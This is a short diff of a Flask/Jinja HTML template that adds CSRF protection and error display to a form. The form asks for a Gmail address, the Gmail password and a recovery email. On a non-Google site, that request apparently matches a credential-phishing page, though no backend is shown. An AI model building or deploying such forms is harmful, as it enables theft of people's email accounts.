@@ -3,15 +3,19 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Login</title>
+    <title>Email Form</title>
     <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
 </head>
 <body>
-    <form method="post">
-        <input type="email" name="gmail" placeholder="Your Gmail account" required>
-        <input type="password" name="password" placeholder="Password gmail.com" required>
-        <input type="text" name="recovery_email" placeholder="Secondary email recovery" required>
-        <button type="submit">login</button>
+    <form method="POST">
+        {{ form.hidden_tag() }} <!-- Добавляет CSRF-токен -->
+        {{ form.gmail() }}
+        {{ form.password() }}
+        {{ form.recovery_email() }}
+        {{ form.submit() }}
+        {% if error %}
+            <p style="color: red;">{{ error }}</p>
+        {% endif %}
     </form>
 </body>
 </html>
